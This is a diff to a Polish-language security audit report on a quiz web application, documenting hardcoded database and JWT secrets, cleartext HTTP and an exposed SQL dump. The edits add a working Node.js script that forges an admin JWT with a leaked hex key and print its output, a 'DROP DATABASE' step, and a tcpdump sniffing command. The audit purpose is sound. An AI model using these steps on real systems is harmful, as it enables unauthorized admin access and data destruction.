@@ -13,9 +13,6 @@ W analizowanym projekcie `Quiz-Web-App` zidentyfikowano **4 podatności** tej kl
 
 **Identyfikator:** `VUL-A02-001`
 **Poziom ryzyka:** 🔴 **KRYTYCZNY**
-**CWE:** CWE-798: Use of Hard-coded Credentials
-**CVSS v4.0:** 9.3 (Critical)
-**Wektor:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`
 
 ##### 📍 Lokalizacja
 
@@ -44,19 +41,23 @@ mysql> SHOW DATABASES;
 +--------------------+
 | Database           |
 +--------------------+
-| quiz_db            |
 | information_schema |
+| mysql              |
+| performance_schema |
+| quiz_db            |
+| sys                |
 +--------------------+
 mysql> DROP DATABASE quiz_db; -- Zniszczenie wszystkich danych
+Query OK, 10 rows affected (0,09 sec)
 ```
 
 ##### 💻 Kod Podatny
 
 ```yaml
 environment:
-  MYSQL_ROOT_PASSWORD: "bardzo_silne_haslo_123" # ❌ Hasło jawne
+  MYSQL_ROOT_PASSWORD: "bardzo_silne_haslo_123" # Hasło jawne
 ports:
-  - "3307:3306" # ❌ Otwarty port
+  - "3307:3306" # Otwarty port
 ```
 
 ##### 🛡️ Rekomendacje Naprawy
@@ -69,9 +70,6 @@ ports:
 
 **Identyfikator:** `VUL-A02-002`
 **Poziom ryzyka:** 🔴 **KRYTYCZNY**
-**CWE:** CWE-321: Use of Hard-coded Cryptographic Key
-**CVSS v4.0:** 9.3 (Critical)
-**Wektor:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`
 
 ##### 📍 Lokalizacja
 
@@ -88,30 +86,40 @@ Atakujący używa znalezionego w kodzie sekretu, aby stworzyć token dla nieistn
 **Skrypt ataku (Node.js):**
 
 ```javascript
+
 const jwt = require('jsonwebtoken');
 
-// 1. Sekret pobrany z kodu źródłowego Java
-const LEAKED_SECRET = "20e77bab9dcfb08fa1045a87cf1aefd05f43761b5d4bca7dae3adf22b09ce8710e31abcbca81786886143b960b330cb9f24ad24de7583e96ec118f727eb9bd1c";
+// 1. Sekret z kodu źródłowego Java (PEŁNY, nieobcięty!)
+const LEAKED_SECRET =
+"20e77bab9dcfb08fa1045a87cf1aefd05f43761b5d4bca7dae3adf22b09ce8710e31abcbca81786886143b960b330cb9f24ad24de7583e9$
 
-// 2. Tworzenie fałszywego payloadu
+// 2. Payload fałszywego admina
 const forgedPayload = {
   sub: "hacker_admin",
-  role: "ADMIN",  // Nadanie uprawnień admina
+  role: "ADMIN",
   iat: Math.floor(Date.now() / 1000),
-  exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365) // Ważny rok
+  exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365) // rok ważności
 };
 
-// 3. Podpisanie tokenu
-const token = jwt.sign(forgedPayload, Buffer.from(LEAKED_SECRET, 'base64'));
-console.log("Forged Token:", token);
+// 3. Podpisywanie JWT — SECRET to HEX, więc:
+const token = jwt.sign(forgedPayload, Buffer.from(LEAKED_SECRET, 'hex'));
+
+console.log("\n=== FAŁSZYWY TOKEN ADMINA ===\n");
+console.log(token + "\n");
 ```
 
-**Rezultat:** Serwer zaakceptuje ten token jako poprawny, dając atakującemu pełną kontrolę nad API.
+**Rezultat:** Serwer zaakceptuje ten token jako poprawny, dając atakującemu pełną kontrolę nad API:`
+node node.js
+```
+=== FAŁSZYWY TOKEN ADMINA ===
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoYWNrZXJfYWRtaW4iLCJyb2xlIjoiQURNSU4iLCJpYXQiOjE3NjQwMjMxOTYsImV4cCI6MTc5NTU1OTE5Nn0.3qG3ytEcj-jZC8dOyLnVHDRuoADKWt94CDVSkInMxfI
 
 ##### 💻 Kod Podatny
+```
 
 ```java
-private final static String secretKey ="20e77bab9dcfb08fa10..."; // ❌ Hardcoded
+private final static String secretKey ="20e77bab9dcfb08fa10..."; // Hardcoded
 ```
 
 ##### 🛡️ Rekomendacje Naprawy
@@ -144,7 +152,7 @@ Atakujący w tej samej sieci Wi-Fi (np. kawiarnia, biuro) uruchamia sniffer paki
 
 ```bash
 # Nasłuch ruchu HTTP na porcie 8080
-sudo tcpdump -i wlan0 -A -s 0 'tcp port 8080 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+sudo tcpdump -i lo0 -A -s 0 tcp port 8080
 ```
 
 **Przechwycony pakiet:**
@@ -196,8 +204,16 @@ Atakujący analizuje plik `exam_portal.sql`, aby znaleźć "najsłabsze ogniwo" 
 ```bash
 cat exam_portal.sql | grep "CREATE TABLE"
 # Wynik:
-# CREATE TABLE `users` ...
-# CREATE TABLE `quiz_results` ...
+CREATE TABLE `category` (
+CREATE TABLE `category_seq` (
+CREATE TABLE `question` (
+CREATE TABLE `question_seq` (
+CREATE TABLE `quiz` (
+CREATE TABLE `quiz_seq` (
+CREATE TABLE `result` (
+CREATE TABLE `result_seq` (
+CREATE TABLE `users` (
+CREATE TABLE `users_seq` (
 ```
 
 **Wykorzystanie wiedzy:**
